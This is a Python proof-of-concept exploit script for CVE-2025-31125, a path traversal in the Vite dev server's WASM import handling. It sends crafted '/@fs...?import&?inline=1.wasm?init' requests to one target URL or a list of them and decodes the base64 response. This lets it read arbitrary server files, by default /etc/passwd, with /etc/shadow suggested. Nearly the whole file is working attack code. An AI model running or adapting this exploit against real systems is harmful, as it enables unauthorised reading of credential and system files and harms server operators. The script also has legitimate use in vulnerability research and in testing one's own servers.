#!/usr/bin/env python3

import requests
import urllib3
import base64
import re
import argparse
import subprocess
from urllib.parse import urljoin

# Banner with toilet using a different font
def print_banner():
    try:
        subprocess.run(["toilet", "-f", "smmono9", "-F", "metal", "CVE-2025-31125"], check=True)
    except FileNotFoundError:
        print("[!] 'toilet' command not found. Defaulting to plain text.")
        print("CVE-2025-31125")
    except Exception as e:
        print(f"[!] Error displaying banner: {e}")

    print("""
─────────────────────────────────────────────────────────────
 🛡️  CVE-2025-31125 — Vite WASM Import Path Traversal
 📌  By 0xgh057r3c0n
 🧬  Attempts to extract and decode embedded base64 WASM
─────────────────────────────────────────────────────────────
""")

# Decode base64 WASM
def extract_base64_and_decode(content):
    match = re.search(r'base64,([^"\s]+)', content)
    if match:
        encoded = match.group(1)
        try:
            decoded = base64.b64decode(encoded).decode(errors='ignore')
            print("[+] Decoded Base64 Content:\n")
            print(decoded)
        except Exception as e:
            print(f"[!] Base64 decoding failed: {e}")
    else:
        print("[!] No base64 WebAssembly found.")

# Send exploit request
def exploit_target(target, verify_ssl, file_path):
    endpoints = [
        f"/@fs{file_path}?import&?inline=1.wasm?init"
    ]

    for endpoint in endpoints:
        url = urljoin(target, endpoint)
        print(f"\n[*] Requesting: {url}")
        try:
            response = requests.get(url, timeout=10, verify=verify_ssl)
            if response.ok:
                extract_base64_and_decode(response.text)
            else:
                print(f"[!] HTTP {response.status_code} received for {url}")
        except requests.RequestException as e:
            print(f"[!] Request to {url} failed: {e}")

# Main
def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-31125 by 0xgh057r3c0n")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-f", "--file", help="File with target URLs")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--path", default="/etc/passwd", help="Custom file path to replace in the exploit (e.g., /etc/passwd or /etc/shadow)")
    args = parser.parse_args()

    # Suppress SSL warnings if --no-verify is used
    if args.no_verify:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print_banner()

    verify_ssl = not args.no_verify
    file_path = args.path

    if args.url:
        exploit_target(args.url, verify_ssl, file_path)
    elif args.file:
        try:
            with open(args.file, "r") as f:
                for line in f:
                    target = line.strip()
                    if target:
                        exploit_target(target, verify_ssl, file_path)
        except Exception as e:
            print(f"[!] Failed to read file {args.file}: {e}")

if __name__ == "__main__":
    main()

